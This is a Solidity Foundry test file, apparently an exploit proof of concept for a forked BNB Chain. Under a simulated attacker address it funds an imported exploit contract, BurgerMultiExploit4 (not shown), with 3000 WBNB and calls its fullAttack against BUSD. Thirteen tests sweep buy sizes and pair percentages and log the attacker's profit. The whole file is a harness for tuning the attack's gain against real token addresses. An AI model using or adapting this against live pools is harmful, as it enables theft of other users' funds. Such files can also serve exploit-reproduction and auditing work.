// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "./BurgerMultiTest4.t.sol";

contract BurgerMultiTest11 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;

    function _runAttack(uint256 buyAmt, uint256 seedAmt, uint256 pairPct) internal returns (int256) {
        address att = makeAddr("attacker");
        vm.deal(att, 5000 ether);
        vm.startPrank(att);

        BurgerMultiExploit4 e = new BurgerMultiExploit4();
        IWBNB(WBNB).deposit{value: 3000 ether}();
        IWBNB(WBNB).transfer(address(e), 3000 ether);

        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(e));
        e.fullAttack(BUSD, buyAmt, seedAmt, pairPct);
        uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(e));
        vm.stopPrank();
        return int256(wbnbAfter) - int256(wbnbBefore);
    }

    function test_buy300_seed20_pct45() public {
        int256 d = _runAttack(300 ether, 20 ether, 45);
        emit log_named_int("delta", d);
    }

    function test_buy300_seed20_pct50() public {
        int256 d = _runAttack(300 ether, 20 ether, 50);
        emit log_named_int("delta", d);
    }

    function test_buy300_seed20_pct55() public {
        int256 d = _runAttack(300 ether, 20 ether, 55);
        emit log_named_int("delta", d);
    }

    function test_buy300_seed20_pct60() public {
        int256 d = _runAttack(300 ether, 20 ether, 60);
        emit log_named_int("delta", d);
    }

    function test_buy300_seed20_pct65() public {
        int256 d = _runAttack(300 ether, 20 ether, 65);
        emit log_named_int("delta", d);
    }

    function test_buy300_seed20_pct75() public {
        int256 d = _runAttack(300 ether, 20 ether, 75);
        emit log_named_int("delta", d);
    }

    function test_buy500_seed20_pct40() public {
        int256 d = _runAttack(500 ether, 20 ether, 40);
        emit log_named_int("delta", d);
    }

    function test_buy500_seed20_pct50() public {
        int256 d = _runAttack(500 ether, 20 ether, 50);
        emit log_named_int("delta", d);
    }

    function test_buy500_seed20_pct60() public {
        int256 d = _runAttack(500 ether, 20 ether, 60);
        emit log_named_int("delta", d);
    }

    function test_buy700_seed20_pct40() public {
        int256 d = _runAttack(700 ether, 20 ether, 40);
        emit log_named_int("delta", d);
    }

    function test_buy700_seed20_pct50() public {
        int256 d = _runAttack(700 ether, 20 ether, 50);
        emit log_named_int("delta", d);
    }

    function test_buy1000_seed20_pct40() public {
        int256 d = _runAttack(1000 ether, 20 ether, 40);
        emit log_named_int("delta", d);
    }

    function test_buy1000_seed20_pct50() public {
        int256 d = _runAttack(1000 ether, 20 ether, 50);
        emit log_named_int("delta", d);
    }
}
